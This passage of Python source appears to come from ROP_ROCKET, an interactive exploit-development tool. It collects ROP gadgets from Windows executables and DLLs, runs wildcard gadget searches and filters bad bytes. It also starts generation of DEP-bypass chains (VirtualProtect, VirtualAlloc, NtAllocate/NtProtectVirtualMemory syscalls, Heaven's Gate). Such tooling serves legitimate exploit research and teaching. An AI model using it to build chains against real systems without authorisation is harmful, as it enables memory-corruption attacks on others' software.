	printRetDict('divRAX','',fg.divRAX,64)
	printRetDict('divRDX','',fg.divRDX,64)
	printRetDict('lea','',fg.lea,64)
	printRetDict('leaRAX','',fg.leaRAX,64)
	printRetDict('leaRBX','',fg.leaRBX,64)
	printRetDict('leaRCX','',fg.leaRCX,64)
	printRetDict('leaRDX','',fg.leaRDX,64)
	printRetDict('leaRSI','',fg.leaRSI,64)
	printRetDict('leaRDI','',fg.leaRDI,64)
	printRetDict('leaRBP','',fg.leaRBP,64)
	printRetDict('leaRSP','',fg.leaRSP,64)
	printRetDict('leaR8','',fg.leaR8,64)
	printRetDict('leaR9','',fg.leaR9,64)
	printRetDict('leaR10','',fg.leaR10,64)
	printRetDict('leaR11','',fg.leaR11,64)
	printRetDict('leaR12','',fg.leaR12,64)
	printRetDict('leaR13','',fg.leaR13,64)
	printRetDict('leaR14','',fg.leaR14,64)
	printRetDict('leaR15','',fg.leaR15,64)
	printRetDict('xchg64','',fg.xchg64,64)
	printRetDict('xchgRAX','',fg.xchgRAX,64)
	printRetDict('xchgRBX','',fg.xchgRBX,64)
	printRetDict('xchgRCX','',fg.xchgRCX,64)
	printRetDict('xchgRDX','',fg.xchgRDX,64)
	printRetDict('xchgRSI','',fg.xchgRSI,64)
	printRetDict('xchgRDI','',fg.xchgRDI,64)
	printRetDict('xchgRBP','',fg.xchgRBP,64)
	printRetDict('xchgRSP','',fg.xchgRSP,64)
	printRetDict('xchgGS','',fg.xchgGS,64)
	printRetDict('xchgR8','',fg.xchgR8,64)
	printRetDict('xchgR9','',fg.xchgR9,64)
	printRetDict('xchgR10','',fg.xchgR10,64)
	printRetDict('xchgR11','',fg.xchgR11,64)
	printRetDict('xchgR12','',fg.xchgR12,64)
	printRetDict('xchgR13','',fg.xchgR13,64)
	printRetDict('xchgR14','',fg.xchgR14,64)
	printRetDict('xchgR15','',fg.xchgR15,64)
	printRetDict('neg','',fg.neg,64)
	printRetDict('negRAX','',fg.negRAX,64)
	printRetDict('negRBX','',fg.negRBX,64)
	printRetDict('negRCX','',fg.negRCX,64)
	printRetDict('negRDX','',fg.negRDX,64)
	printRetDict('negRSI','',fg.negRSI,64)
	printRetDict('negRDI','',fg.negRDI,64)
	printRetDict('negRSP','',fg.negRSP,64)
	printRetDict('negRBP','',fg.negRBP,64)
	printRetDict('negR8','',fg.negR8,64)
	printRetDict('negR9','',fg.negR9,64)
	printRetDict('negR10','',fg.negR10,64)
	printRetDict('negR11','',fg.negR11,64)
	printRetDict('negR12','',fg.negR12,64)
	printRetDict('negR13','',fg.negR13,64)
	printRetDict('negR14','',fg.negR14,64)
	printRetDict('negR15','',fg.negR15,64)
	printRetDict('xor','',fg.xor,64)
	printRetDict('xorZeroRAX','',fg.xorZeroRAX,64)
	printRetDict('xorRAX','',fg.xorRAX,64)
	printRetDict('xorZeroRBX','',fg.xorZeroRBX,64)
	printRetDict('xorRBX','',fg.xorRBX,64)
	printRetDict('xorZeroRCX','',fg.xorZeroRCX,64)
	printRetDict('xorRCX','',fg.xorRCX,64)
	printRetDict('xorZeroRDX','',fg.xorZeroRDX,64)
	printRetDict('xorRDX','',fg.xorRDX,64)
	printRetDict('xorZeroRSI','',fg.xorZeroRSI,64)
	printRetDict('xorRSI','',fg.xorRSI,64)
	printRetDict('xorZeroRDI','',fg.xorZeroRDI,64)
	printRetDict('xorRDI','',fg.xorRDI,64)
	printRetDict('xorZeroRSP','',fg.xorZeroRSP,64)
	printRetDict('xorRSP','',fg.xorRSP,64)
	printRetDict('xorZeroRBP','',fg.xorZeroRBP,64)
	printRetDict('xorRBP','',fg.xorRBP,64)
	printRetDict('xorZeroR8','',fg.xorZeroR8,64)
	printRetDict('xorR8','',fg.xorR8,64)
	printRetDict('xorZeroR9','',fg.xorZeroR9,64)
	printRetDict('xorR9','',fg.xorR9,64)
	printRetDict('xorZeroR10','',fg.xorZeroR10,64)
	printRetDict('xorR10','',fg.xorR10,64)
	printRetDict('xorZeroR11','',fg.xorZeroR11,64)
	printRetDict('xorR11','',fg.xorR11,64)
	printRetDict('xorZeroR12','',fg.xorZeroR12,64)
	printRetDict('xorR12','',fg.xorR12,64)
	printRetDict('xorZeroR13','',fg.xorZeroR13,64)
	printRetDict('xorR13','',fg.xorR13,64)
	printRetDict('xorZeroR14','',fg.xorZeroR14,64)
	printRetDict('xorR14','',fg.xorR14,64)
	printRetDict('xorZeroR15','',fg.xorZeroR15,64)
	printRetDict('xorR15','',fg.xorR15,64)
	printRetDict('xorQwordRAX','',fg.xorQwordRAX,64)
	printRetDict('xorQwordRBX','',fg.xorQwordRBX,64)
	printRetDict('xorQwordRCX','',fg.xorQwordRCX,64)
	printRetDict('xorQwordRDX','',fg.xorQwordRDX,64)
	printRetDict('xorQwordRSI','',fg.xorQwordRSI,64)
	printRetDict('xorQwordRDI','',fg.xorQwordRDI,64)
	printRetDict('xorQwordRSP','',fg.xorQwordRSP,64)
	printRetDict('xorQwordRBP','',fg.xorQwordRBP,64)
	printRetDict('xorR8','',fg.xorR8,64)
	printRetDict('xorR9','',fg.xorR9,64)
	printRetDict('xorR10','',fg.xorR10,64)
	printRetDict('xorR11','',fg.xorR11,64)
	printRetDict('xorR12','',fg.xorR12,64)
	printRetDict('xorR13','',fg.xorR13,64)
	printRetDict('xorR14','',fg.xorR14,64)
	printRetDict('xorR15','',fg.xorR15,64)
	printRetDict('xorGS','',fg.xorGS,64)
	printRetDict('mov64','',fg.mov64,64)
	printRetDict('movRAX','',fg.movRAX,64)
	print ("movRAX count", len(fg.movRAX))
	printRetDict('movRBX','',fg.movRBX,64)
	printRetDict('movRCX','',fg.movRCX,64)
	printRetDict('movRDX','',fg.movRDX,64)
	printRetDict('movRSI','',fg.movRSI,64)
	printRetDict('movRDI','',fg.movRDI,64)
	printRetDict('movRSP','',fg.movRSP,64)
	printRetDict('movRBP','',fg.movRBP,64)
	printRetDict('movR8','',fg.movR8,64)
	printRetDict('movR9','',fg.movR9,64)
	printRetDict('movR10','',fg.movR10,64)
	printRetDict('movR11','',fg.movR11,64)
	printRetDict('movR12','',fg.movR12,64)
	printRetDict('movR13','',fg.movR13,64)
	printRetDict('movR14','',fg.movR14,64)
	printRetDict('movR15','',fg.movR15,64)
	printRetDict('movQword2','',fg.movQword2,64)
	printRetDict('movQword2RAX','',fg.movQword2RAX,64)
	printRetDict('movQword2RBX','',fg.movQword2RBX,64)
	printRetDict('movQword2RCX','',fg.movQword2RCX,64)
	printRetDict('movQword2RDX','',fg.movQword2RDX,64)
	printRetDict('movQword2RSI','',fg.movQword2RSI,64)
	printRetDict('movQword2RDI','',fg.movQword2RDI,64)
	printRetDict('movQword2RSP','',fg.movQword2RSP,64)
	printRetDict('movQword2RBP','',fg.movQword2RBP,64)
	printRetDict('movQword2R8','',fg.movQword2R8,64)
	printRetDict('movQword2R9','',fg.movQword2R9,64)
	printRetDict('movQword2R10','',fg.movQword2R10,64)
	printRetDict('movQword2R11','',fg.movQword2R11,64)
	printRetDict('movQword2R12','',fg.movQword2R12,64)
	printRetDict('movQword2R13','',fg.movQword2R13,64)
	printRetDict('movQword2R14','',fg.movQword2R14,64)
	printRetDict('movQword2R15','',fg.movQword2R15,64)
	printRetDict('movConstant64','',fg.movConstant64,64)
	printRetDict('movConstantRAX','',fg.movConstantRAX,64)
	printRetDict('movConstantRBX','',fg.movConstantRBX,64)
	printRetDict('movConstantRCX','',fg.movConstantRCX,64)
	printRetDict('movConstantRDX','',fg.movConstantRDX,64)
	printRetDict('movConstantRSI','',fg.movConstantRSI,64)
	printRetDict('movConstantRDI','',fg.movConstantRDI,64)
	printRetDict('movConstantRSP','',fg.movConstantRSP,64)
	printRetDict('movConstantRBP','',fg.movConstantRBP,64)
	printRetDict('movConstantR8','',fg.movConstantR8,64)
	printRetDict('movConstantR9','',fg.movConstantR9,64)
	printRetDict('movConstantR10','',fg.movConstantR10,64)
	printRetDict('movConstantR11','',fg.movConstantR11,64)
	printRetDict('movConstantR12','',fg.movConstantR12,64)
	printRetDict('movConstantR13','',fg.movConstantR13,64)
	printRetDict('movConstantR14','',fg.movConstantR14,64)
	printRetDict('movConstantR15','',fg.movConstantR15,64)
	printRetDict('movQword','',fg.movQword,64)
	printRetDict('movQwordRAX','',fg.movQwordRAX,64)
	printRetDict('movQwordRBX','',fg.movQwordRBX,64)
	printRetDict('movQwordRCX','',fg.movQwordRCX,64)
	printRetDict('movQwordRDX','',fg.movQwordRDX,64)
	printRetDict('movQwordRDI','',fg.movQwordRDI,64)
	printRetDict('movQwordRSI','',fg.movQwordRSI,64)
	printRetDict('movQwordRBP','',fg.movQwordRBP,64)
	printRetDict('movQwordRSP','',fg.movQwordRSP,64)
	printRetDict('movR8','',fg.movR8,64)
	printRetDict('movR9','',fg.movR9,64)
	printRetDict('movR10','',fg.movR10,64)
	printRetDict('movR11','',fg.movR11,64)
	printRetDict('movR12','',fg.movR12,64)
	printRetDict('movR13','',fg.movR13,64)
	printRetDict('movR14','',fg.movR14,64)
	printRetDict('movR15','',fg.movR15,64)
	printRetDict('movGSSpecial','',fg.movGSSpecial,64)
	printRetDict('popal64','',fg.popal64,64)
	printRetDict('pushad64','',fg.pushad64,64)
	printRetDict('shlQword','',fg.shlQword,64)
	printRetDict('shl64','',fg.shl64,64)
	printRetDict('shrQword','',fg.shrQword,64)
	printRetDict('shr64','',fg.shr64,64)
	printRetDict('rcrQword','',fg.rcrQword,64)
	printRetDict('rcr64','',fg.rcr64,64)
	printRetDict('rclQword','',fg.rclQword,64)
	printRetDict('rcl64','',fg.rcl64,64)
	printRetDict('notInst64','',fg.notInst64,64)
	printRetDict('notInstRAX','',fg.notInstRAX,64)
	printRetDict('notInstRBX','',fg.notInstRBX,64)
	printRetDict('notInstRCX','',fg.notInstRCX,64)
	printRetDict('notInstRDX','',fg.notInstRDX,64)
	printRetDict('notInstRSI','',fg.notInstRSI,64)
	printRetDict('notInstRDI','',fg.notInstRDI,64)
	printRetDict('notInstRSP','',fg.notInstRSP,64)
	printRetDict('notInstRBP','',fg.notInstRBP,64)
	printRetDict('notInstR8','',fg.notInstR8,64)
	printRetDict('notInstR9','',fg.notInstR9,64)
	printRetDict('notInstR10','',fg.notInstR10,64)
	printRetDict('notInstR11','',fg.notInstR11,64)
	printRetDict('notInstR12','',fg.notInstR12,64)
	printRetDict('notInstR13','',fg.notInstR13,64)
	printRetDict('notInstR14','',fg.notInstR14,64)
	printRetDict('notInstR15','',fg.notInstR15,64)
	printRetDict('andInst64','',fg.andInst64,64)
	printRetDict('andInstRAX','',fg.andInstRAX,64)
	printRetDict('andInstRBX','',fg.andInstRBX,64)
	printRetDict('andInstRCX','',fg.andInstRCX,64)
	printRetDict('andInstRDX','',fg.andInstRDX,64)
	printRetDict('andInstRSI','',fg.andInstRSI,64)
	printRetDict('andInstRDI','',fg.andInstRDI,64)
	printRetDict('andInstRSP','',fg.andInstRSP,64)
	printRetDict('andInstRBP','',fg.andInstRBP,64)
	printRetDict('andInstR8','',fg.andInstR8,64)
	printRetDict('andInstR9','',fg.andInstR9,64)
	printRetDict('andInstR10','',fg.andInstR10,64)
	printRetDict('andInstR11','',fg.andInstR11,64)
	printRetDict('andInstR12','',fg.andInstR12,64)
	printRetDict('andInstR13','',fg.andInstR13,64)
	printRetDict('andInstR14','',fg.andInstR14,64)
	printRetDict('andInstR15','',fg.andInstR15,64)
	printRetDict('unusual64','',fg.unusual64,64)
	printRetDict('fs64','',fg.fs64,64)
	printRetDict('fsSpecial64','',fg.fsSpecial64,64)

def captureRopGadgets():
	pass

def findGadget():

#  findGeneric(instruction,reg,bad,length1, excludeRegs,espDesiredMovement=0):
	
	
	bExists=False
	print (mag+"\n   Find allows us to search for a gadget.\n " + red +"  * " + res + " is wildcard. " + red + "#" + res + " or "+red+";"+res+" are delimiters.\n   Enter desired expression and hit enter to end input.")
	print (res+"\n   E.g. "+cya+"    pop edi ; ret")
	print ("            pop esp#ret")
	print ("            mov dword ptr [eax], ebx#ret  " + yel + " - must use \'dword ptr\' if applicable  ")
	print (cya+"            add eax, 1#*#ret")
	print(yel + "   Find: " +mag, end="")
	userIN = input()
	selections = userIN.replace(";", "#")
	# print (selections)
	selections = selections.split("#")
	t=0
	# print (selections)
	for s in selections:
		selections[t]=s.strip()
		t+=1
	# print (selections)
	start=selections[0]
	
	hasWildcard=False
	if "*" in userIN:
		# print ("has wildcard")
		hasWildcard=True

	startComponents = start.split()
	# print (startComponents)

	# if "dword" not in start: 
	# 	bExists, myDict=fg.getFg(startComponents[0], startComponents[1])
	# else:
	# 	print ("startComponents", startComponents)
	# 	print ("startComponents[1]", startComponents[1])

	# 	if "dword" in startComponents[1]:
	# 		print ("starting")
	# 		firstReg = re.findall("eax|ebx|ecx|edx|esi|edi|ebp|esp", start, re.IGNORECASE)
	# 		if firstReg:
	# 			print ("found")
	# 			firstReg1=firstReg[0].replace("[","")
	# 			firstReg1=firstReg1.replace("]","")

	# 			print (firstReg, firstReg1)
	# 		else:
	# 			print ("NOT FOUND")
	# 			print (firstReg)
	# 		bExists, myDict=fg.getFg(startComponents[0] + "Dword", firstReg1)
	# 	if "dword" in startComponents[2]:
	# 		print ("it is here")
	# 		print ("starting")
	# 		foundReg = re.findall("eax|ebx|ecx|edx|esi|edi|ebp|esp", start, re.IGNORECASE)
	# 		if foundReg:
	# 			print ("found")
	# 			secReg=foundReg[1].replace("[","")
	# 			secReg=secReg.replace("]","")
	# 			print (foundReg, secReg)
	# 		else:
	# 			print ("NOT FOUND")
	# 			print (foundReg)
	# 		bExists, myDict=fg.getFg(startComponents[0] + "Dword2", foundReg[0])
	
	if bExists==False:
		foundReg = re.findall("eax|ebx|ecx|edx|esi|edi|ebp|esp", start, re.IGNORECASE)
		testVal=""
		testVal2=""

		try:
			testVal=startComponents[1]
		except:
			pass

		try:
			testVal2=startComponents[2]
		except:
			pass
			
		if "dword" in testVal:
			bExists, myDict=fg.getFg(startComponents[0]+"Dword", foundReg[0])
		elif "dword" in testVal2:
			bExists, myDict=fg.getFg(startComponents[0] + "Dword2", foundReg[0])
		else:
			bExists, myDict=fg.getFg(startComponents[0], foundReg[0])
		
	foundWilds =  {}

	

	if bExists:
		# print ("bExists")
		t=0
		for p in myDict:
			freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

			if freeBad:
				myDis=disOffset(p)
				myDis=myDis.split( " # ")
				dp ("\tmydis", myDis)
				# if "dword" in myDis:
				# 	print ("p", p, disOffset(p),"len", myDict[p].length, myDict[p].opcode,freeBad )
				q=0
				sIsGood=True
				inWildMode=False
				foundNext=False
				for s in selections:
					if "*" in s: # and myDict[p].opcode == "c2":
						# print (gre+"has wildcard"+mag)
						hasWildcard=True			
					# if myDict[p].opcode == "c2":
					# 	print ("----->  s", s,q)
					if s == myDis[q].strip():
						# if myDict[p].opcode == "c2":
						# print ("\t\tsame", s, myDis[q],q, p)
						pass
					else:
						# print ("\t\tnot same", s, myDis[q],q)
						# if myDict[p].opcode == "c2":
							
						# print ("\t\tnotsame2", s, myDis[q],"stripped", myDis[q], "target", s,q, p)
						if not hasWildcard: # and myDict[p].opcode == "c2":
							sIsGood=False
						if hasWildcard: # and myDict[p].opcode == "c2":
							if s =="*":
								inWildMode=True
								dp(res+"inWildMode")
								nextS=selections[q+1].strip()
								dp ("nextS", nextS)
								v=q
								q2=0
								foundNext=False
								for e2 in myDis:
									dp ("v", v, "q2",q2, "nextS", nextS, myDis[q2])
									if nextS.strip()==myDis[q2].strip():
										# print (cya+"we foudn the next",myDis[q2], v, q2)
										# print (mag)
										hasWildcard=False
										# print (gre+"has NOT wildcard"+mag)

										foundNext=True
										foundNextDiff=q2-v
										q=q2-1
										continue
									q2+=1
								dp (mag)
						if not foundNext:
							sIsGood=False
							break
					q+=1
				
				# print ("left loop")
				if sIsGood and q == len(myDis):
					foundWilds[p]=fg.rop[p]
					# print ("q", q,len(myDis))
					# print ("p", p, disOffset(p),"len", myDict[p].length, myDict[p].opcode,freeBad )
					# print (red+"WE HAVE MATCH"+mag)
			t+=1
			# if t>=8000:
			# if len(foundWilds) >= 20:
			# 	break
			# 	break

	# if foundWilds:
	# 	t=0
	# 	if len(foundWilds) > 20:
	# 		print ("   The first 20 results of " +  str(len(foundWilds)) + " are shown.")
	# 	else:
	# 		print ("   This search has produced " +  str(len(foundWilds)) + " results.")

	# 	for p in foundWilds:
	# 		print (t,"p", p, disOffset(p),"len", myDict[p].length, myDict[p].opcode,freeBad )
	# 		if t>= 20:
	# 			break
	# 		t+=1
	if len(foundWilds) > 0:
		if len(foundWilds) > 15:
			print (yel+"   The first 15 results of " +  str(len(foundWilds)) + " are shown."+gre)
		else:
			print (yel+"   This search has produced " +  str(len(foundWilds)) + " results."+gre)

		printRetDictMini(foundWilds, 20)
		printWilds(foundWilds, userIN)


	return
	dp ("findGeneric", instruction, reg)
	bExists, myDict=fg.getFg(instruction,reg)
	if bExists:
		dp ("it exists")
		if length1:  # was if length1  - this way it will always try length1 first - ideal, perfect gadget
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				# print ("p", p, disOffset(p),"len", myDict[p].length, myDict[p].opcode,freeBad )
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad:
					dp ("found ",instruction, reg) 
					return True,p
			return False,0
		if not length1: # was else
			for p in myDict:
				freeBad=checkFreeBadBytes(opt,fg,p,bad,fg.rop,pe,n, opt["bad_bytes_imgbase"])

				freeBad=False
				if myDict[p].length ==1 and myDict[p].opcode=="c3" and freeBad:
					dp ("found ", instruction, reg)
					return True,p, myDict
				dp (instruction," clob")
				mdExist, m1, myDict, rObj = rop_testerFindClobberFree((instruction,reg), excludeRegs,bad, "c3", espDesiredMovement,[])
				if mdExist:
					dp ("found alt", instruction, reg)
					return True,m1
				else:
					return False,0
	else:
		dp ("it does not exist")
		# dp ("return false ", instruction)
		return False,0

def genObfs():
	# for dll in pe:
	# 	print(pe[dll].modName)
	# 	print(hex(pe[dll].emBase))
	# 	print(hex(pe[dll].ImageBase))
	# 	print(hex(pe[dll].startLoc))
	# 	print(hex(pe[dll].ImageBase + pe[dll].VirtualAdd))

	printObfMenu()
	# t=int(user,16)
	t=0x300282
	o=0x1282
# 	0x00401282, # (0x1282) pop esp # ret  # rop_tester_syscall.exe # \x5c\xc3 # length: 1
# ---> em  0x300282
	i=0x00401282
	j=i-pe[n].startLoc+pe[n].emBase
	l=o+pe[n].emBase-pe[n].VirtualAdd

	
def genHeavanGatex32():
	# excludeRegs=[]
	# bad=[]
	# global bad
	buildPushad([], "HG32" )
def genHeavanGatex64():
	buildHG([],[])
def genWinSyscallNtAllocateVirtualMemory():
	global bad
	sysNtAllocParams=["tbd","tbd",0xFFFFFFFF,"ptr",0,"ptr",0x3000,0x40,0x6000]
	print (cya+"   This will attempt to generate a ROP chain using the Windows syscall\n   NtAllocateVirtualMemory for "+yel+"Windows 10/11"+cya+". Other OSs not presently supported.\n"+res)
	buildMovDerefSyscall([],bad, sysNtAllocParams,8 )

def genWinSyscallNtProtectVirtualMemory():
	global bad
	global excludeRegsGlobal
	sysNtProtectParms=["tbd", "tbd", 0xffffffff,"ptr", 1, 0x40, "ptr"]
	print (cya+"   This will attempt to generate a ROP chain using the Windows syscall\n   NtProtectVirtualMemory for "+yel+"Windows 10/11"+cya+". Other OSs not presently supported.\n"+res)
	buildMovDerefSyscallProtect([],bad, sysNtProtectParms,6 )

def genShellcodelessROP_System():
	global bad
	buildPushad(bad, "System" )

def genVirtualProtectPushad():
	global bad
	buildPushad(bad, "VP" )


def genVirtualAllocPushad():
	global bad
	buildPushad(bad, "VA" )

def genMovDerefVP():
	global bad
	vpParams=[0x7877badd, "automatic","automatic",0x0299,0x40,0xbaddcad2]
	buildMovDeref(bad, vpParams,6 )

def genShellcodelessROP_GetProc():
	global bad
	buildPushad(bad, "GetProcAddress" )

	pass
def clearGadgets():
	global fg
	global opt
	try:
		del fg
	except:
		pass
	createFg()
	# dp (len(fg))
	opt["bx64Extracted"]=False
	opt["bx86Extracted"]=False

def printGadgets():
	printSubMenu()

def getBaseDir(filename=None, alt=None):
	filename=peName
	if ".exe" in filename:
		filename =filename.replace(".exe", "")
	base=os.getcwd()
	baseDir  = os.path.join(base, filename, filename)
	if not os.path.isdir(baseDir):
		# print("Creating..")
		os.makedirs(baseDir)
	# print ("baseDir",baseDir)
	# base+="outputs"+"\\"+filename+"\\"
	# print (red+"base", base,res)
	# if not os.path.exists(base):
	# 	os.makedirs(base)
	# # outputs="outputs\\"
	# print ("baseDir",baseDir)
	return baseDir

def printGadgetChain(gadgetTxt, chainType):

	gadgetTxt2=""
	if type(gadgetTxt)==list:
		for g in gadgetTxt:
			gadgetTxt2+=g+"\n\n"
		gadgetTxt=gadgetTxt2
	outputs=getBaseDir(filename2)
	restorePoint = sys.stdout
	sys.stdout = open(outputs+"_"+chainType+".txt", 'w')

	print("")
	sys.stdout = open(outputs+"_"+chainType+".txt", 'a')
	print (gadgetTxt)
	sys.stdout.close()
	sys.stdout = restorePoint
	print ("   Saved to "+ cya +outputs+"_"+chainType+".txt"+res)

def printWilds(myDict, searchStr):
	outputs=getBaseDir(filename2)
	restorePoint = sys.stdout
	# sys.stdout = open(outputs+"_find_gadgets.txt", 'w')
	# print("")
	sys.stdout = open(outputs+"_find_gadgets.txt", 'a')
	printRetDict(searchStr, "", myDict)
	sys.stdout.close()
	sys.stdout = restorePoint
	print ("   Saved to "+ cya + outputs+filename2+"_x86_gadgets.txt"+res)


def printGadgetsx86():
	outputs=getBaseDir(filename2)
	restorePoint = sys.stdout
	sys.stdout = open(outputs+"_x86_gadgets.txt", 'w')
	print("")
	sys.stdout = open(outputs+"_x86_gadgets.txt", 'a')
	printOutputs()
	sys.stdout.close()
	sys.stdout = restorePoint
	print ("   Saved to "+ cya + outputs+"_x86_gadgets.txt"+res)

def printGadgetsx64():
	outputs=getBaseDir(filename2)
	restorePoint = sys.stdout
	sys.stdout = open(outputs+"_x64_gadgets.txt", 'w')
	print("")
	sys.stdout = open(outputs+"_x64_gadgets.txt", 'a')
	printOutputs64()
	sys.stdout.close()
	sys.stdout = restorePoint
	print ("   Saved to "+ cya + outputs+"_x64_gadgets.txt"+res)
def getGadgets():
	genBasesForEm()

	try:
		prevFg=fg
		prevx64=fg.x64
	except:
		pass
	
	n=peName
	if not doParallel:
		get_OP_RET(15)
	else:
		fgK = foundGadgets()
		# startGet_Op_Ret_Parallel()
		startGet_Op_Ret_Parallel()
	
	fg.x86=True
	opt["bx86Extracted"]=True
	try:
		fg.merge(prevFg)
		fg.x64=prevx64
	except:	
		pass
	
	filename2=filenameRaw+"_gadgets.obj"
	# filename3=getBaseDir()+"objfiles"+"\\"+"_gadgets.obj"

	file_pi = open(filename2, 'wb') 
	pickle.dump(fg, file_pi)
	dp ("done pickle getGadgets!")

	# file_pi = open(filename3, 'wb') 
	# pickle.dump(fg, file_pi)

def getGadgetsx6486():
	genBasesForEm()
	global opt
	n=peName
	if not doParallel:
		get_OP_RET(15)
	else:
		fgK = foundGadgets()
		# startGet_Op_Ret_Parallel()
		startGet_Op_Ret_Parallel6486()
		
	fg.x86=True
	fg.x64=True
	opt["bx64Extracted"]=True
	opt["bx86Extracted"]=True
	filename=filenameRaw+"_gadgets.obj"
	file_pi = open(filename, 'wb') 
	pickle.dump(fg, file_pi)
	dp ("done pickle getGadgets!")

def getGadgetsx64():
	genBasesForEm()

	try:
		prevFg=fg
		prevx86=fg.x86
	except:
		pass

	n=peName
	if not doParallel:
		get_OP_RET(15)
	else:
		fgK = foundGadgets()
		# startGet_Op_Ret_Parallel()
		startGet_Op_Ret_Parallel64()
	fg.x64=True	
	opt["bx64Extracted"]=True
	try:
		fg.merge(prevFg)
		fg.x86=prevx86
	except:	
		pass
		
	filename=filenameRaw+"_gadgets.obj"
	file_pi = open(filename, 'wb') 
	pickle.dump(fg, file_pi)
	dp ("done pickle getGadgets!")
	

def clearPEs():
	global pe
	pe.clear()
	pe={}


def getPEs():
	global opt
	global peName
	global n
	n=peName

	settings2={"bImgExc":True,"bSystemDlls":True,"bOtherDlls":True,"bImgExcExtracted":True,"bSystemDllsExtracted":True,"bOtherDllsExtracted":True}
	global needed
	doParallel=True
	if opt["bSystemDlls"]:
		skipSystemDlls=False
	else:
		skipSystemDlls=True
		
	# # skipAllDlls=True
	# skipAllDlls=False

	skipNonExtractedDlls=False
	if opt["bOtherDlls"]:
		bExtractDlls=True
	else:
		bExtractDlls=False
	
	if not opt["bOtherDlls"] and not opt["bSystemDlls"]:
		skipAllDlls=True
	else:
		skipAllDlls=False

	

	Extraction()
	opt["bImgExcExtracted"]=True

	noneBox=[]
	for each in pe[n].dlls:
		bIsFound, notFound=findDLL_IAT(each)
		if not bIsFound:
			noneBox.append(notFound)
	dp ("noneBox", noneBox)

	digDeeper=False
	digDeeper=True
	for dll in pe:
		if not pe[dll].systemWin:
			if dll != n:
				digDeeper=True
	
	if digDeeper and not skipAllDlls:
		dp ("in dig deeper")
		# timeStart = timeit.default_timer()
		files, subdirectories=  run_fast_scandir(pe[n].path,[".dll"],n)
		# timeStop = timeit.default_timer()
		dp ("run_fast_scandir time")
		# dp(str(# timeStop - # timeStart))
		
	for dll in noneBox:
		findDLLOther(dll)

	evaluateDll(skipSystemDlls, skipAllDlls, None)   # skipSystem, skipAll, skipNonextracted  # none = we do not want to apply nonExtract restriction before extracting
	if bExtractDlls:
		extractDlls()
		opt["bSystemDllsExtracted"]=True
		opt["bOtherDllsExtracted"]=True
	evaluateDll(skipSystemDlls, skipAllDlls, skipNonExtractedDlls)   # skipSystem, skipAll, skipNonextracted
	# printPEValuesDict()
	n=peName
	filenamePE=filenameRaw+"_PEs.obj"
	file_pe = open(filenamePE, 'wb') 
	pickle.dump(pe, file_pe)

	filenameDLL=filenameRaw+"_DllDict.obj"
	file_dllDict = open(filenameDLL, 'wb') 
	pickle.dump(dllDict, file_dllDict)


def uiShowExclusionSettings():
	global opt

	if opt["acceptCFG"]:
		togCFG=res+"["+gre+"X"+res+"]"
	else:
		togCFG=res+"["+gre+" "+res+"]"
	if opt["acceptSEH"]:
		togSEH=res+"["+gre+"X"+res+"]"
	else:
		togSEH=res+"["+gre+" "+res+"]"
	if opt["acceptSystemWin"]:
		togSystemWin=res+"["+gre+"X"+res+"]"
	else:
		togSystemWin=res+"["+gre+" "+res+"]"
	if opt["acceptASLR"]:
		togASLR=res+"["+gre+"X"+res+"]"
	else:
		togASLR=res+"["+gre+" "+res+"]"
	if opt["checkForBadBytes"]:
		togBad=res+"["+gre+" "+res+"]"
	else:
		togBad=res+"["+gre+"X"+res+"]"

	bad=opt["badBytes"]

	curBadBytes=binaryToStr(bad)
	if len(curBadBytes)==0:
		curBadBytes="None"
	text = "  If you decide to {} certain exclusion criteria, toggle it.\n  {} means it will be excluded. {} means it will be included.\n\n".format(gre+"accept"+res,gre+"No check"+res, gre+"Check"+res)
	text +="\n  Current Bad Bytes: {}\n\n".format(cya+curBadBytes+res)
	
	text+=yel+"  {}\t {}             {} {} Include gadgets with ASLR in results.\n".format(cya+"1"+res,mag+"ASLR" +res, togASLR, "-"+yel)
	text+=yel+"  {}\t {}              {} {} Include gadgets with CFG in results.\n".format(cya+"2"+res,mag+"CFG" +res, togCFG, "-"+yel)
	text+=yel+"  {}\t {}              {} {} Include gadgets with SEH in results.\n".format(cya+"3"+res,mag+"SEH" +res, togSEH, "-"+yel)
	text+=yel+"  {}\t {}          {} {} Include gadgets that are Windows DLLs in results.\n".format(cya+"4"+res,mag+"Windows" +res, togSystemWin, "-"+yel)
	text+=yel+" {}\t {}        {} {} Include gadgets with bad bytes in results.\n".format(cya+"5"+res,mag+"Bad bytes" +res, togBad, "-"+yel)
	text+=yel+"  {}\t {}  {} {} Clear all bad bytes.\n".format(cya+"6"+res,mag+"Clear bad bytes" +res, "   ", "-"+yel)
	text+=yel+"  {}\t {}    {} {} Add additional bad bytes to exclude.\n".format(cya+"7"+res,mag+"Add bad bytes" +res, "   ", "-"+yel)
	text+=yel+"  {}\t {} {} {} Remove bad bytes from exclusion criteria.\n".format(cya+"8"+res,mag+"Remove bad bytes" +res, "   ", "-"+yel)

	print (text)

def getBadBytesSubmenu():
	# print(uiShowExclusionSettings())
	print(uiShowBadBytes())
	global opt
	global bad
	userIN=""

	# if opt["acceptCFG"]:
	# if opt["acceptSEH"]:
	# if opt["acceptSystemWin"]:
	# if opt["acceptASLR"]:

	while userIN != "e" or userIN !="x":		#Loops on keyboard input
		try:			#Will break the loop on entering x
			print(yel + " ROP_ROCKET>"+ cya+"BadBytes>" +res, end="")
			userIN = input()
			print(res)
			if userIN[0:1] == "c" or userIN[0:1].lower() == "c":
				bad=b''
				opt["badBytes"]=bad
				
			elif userIN[0:1] == "b" or userIN[0:1].lower() == "b":
				uiAddBadBytes()
			elif userIN[0:1] == "r" or userIN[0:1] == "r":
				uiRemoveBadBytes()
			elif userIN[0:1] == "h" or userIN[0:7] == "display":
				print(uiShowBadBytes()) 
			elif userIN[0:1] == "q" or userIN[0:1] == "x":
				break		
			elif userIN[0:1] == "1" or userIN[0:1].lower() == "i":
				toggleImgBase()
			# elif userIN[0:1] == "2" or userIN[0:1].lower() == "o":
			# 	toggleOffsets()
			elif userIN[0:1] == "2" or userIN[0:1].lower() == "2":
				changeImageBase()
			else:
				print("   Invalid input. Enter " + red + "x"+res+" to exit Style.\n")
		except Exception as e:
			print (e)
			print(traceback.format_exc())
			print ("exception")

def uiShowBadBytes():
	global opt
	
	if opt["checkForBadBytes"]:
		togBad=res+"["+gre+" "+res+"]"
	else:
		togBad=res+"["+gre+"X"+res+"]"

